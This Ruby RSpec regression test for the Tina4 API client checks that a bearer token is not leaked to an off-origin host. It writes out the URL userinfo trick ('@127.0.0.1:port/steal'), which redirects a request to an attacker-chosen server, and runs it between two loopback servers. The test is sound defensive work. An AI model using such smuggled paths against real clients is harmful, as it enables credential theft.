# frozen_string_literal: true

# Medium security finding F5 — the configured Authorization token must never be
# sent to a host other than the client's configured base origin.
#
# A path that resolves to an off-origin host (e.g. the userinfo trick
# "@evil:port/x", which URI.parse resolves to host evil) previously reused the
# base client's Authorization header, leaking a bearer token to an attacker-
# chosen host. The cross-origin strip already existed for REDIRECT following;
# this pins it for the initial request target too. Only same-origin requests
# carry the token. Case names match the sibling regressions in
# tina4-nodejs/test/apiCrossOriginToken.test.ts,
# tina4-python/tests/test_api_cross_origin_token.py and
# tina4-php/tests/ApiCrossOriginTokenTest.php.
#
# Two REAL loopback TCP servers (two origins). No mocks.
require "spec_helper"
require "socket"

RSpec.describe "API cross-origin token leak (F5)" do
  # Minimal recording server: captures the headers of the last request it saw.
  class TokenRecordingServer
    def initialize
      @server = TCPServer.new("127.0.0.1", 0)
      @headers = {}
      @running = true
      @thread = Thread.new { serve_loop }
    end

    def port = @server.addr[1]
    def base_url = "http://127.0.0.1:#{port}"
    def last_headers = @headers

    def stop
      @running = false
      @server.close unless @server.closed?
      @thread.join(1) if @thread&.alive?
      @thread.kill if @thread&.alive?
    rescue StandardError
      nil
    end

    private

    def serve_loop
      while @running
        begin
          client = @server.accept
          headers = {}
          request_line = client.gets
          while (line = client.gets) && line != "\r\n"
            key, _, value = line.partition(":")
            headers[key.strip.downcase] = value.strip
          end
          @headers = headers unless request_line.nil?
          body = '{"ok":true}'
          client.write("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n" \
                       "Content-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}")
          client.close
        rescue StandardError
          nil
        end
      end
    end
  end

  it "absolute off-origin path does not leak the Authorization token" do
    base = TokenRecordingServer.new
    evil = TokenRecordingServer.new
    begin
      api = Tina4::API.new(base.base_url)
      api.set_bearer_token("SECRET-TOKEN")
      # Userinfo trick: base_url + this path resolves to host 127.0.0.1:evil_port.
      api.get("@127.0.0.1:#{evil.port}/steal")
      expect(evil.last_headers).not_to have_key("authorization")
    ensure
      base.stop
      evil.stop
    end
  end

  it "same-origin request still carries the Authorization token" do
    base = TokenRecordingServer.new
    begin
      api = Tina4::API.new(base.base_url)
      api.set_bearer_token("SECRET-TOKEN")
      api.get("/me")
      expect(base.last_headers["authorization"]).to eq("Bearer SECRET-TOKEN")
    ensure
      base.stop
    end
  end
end
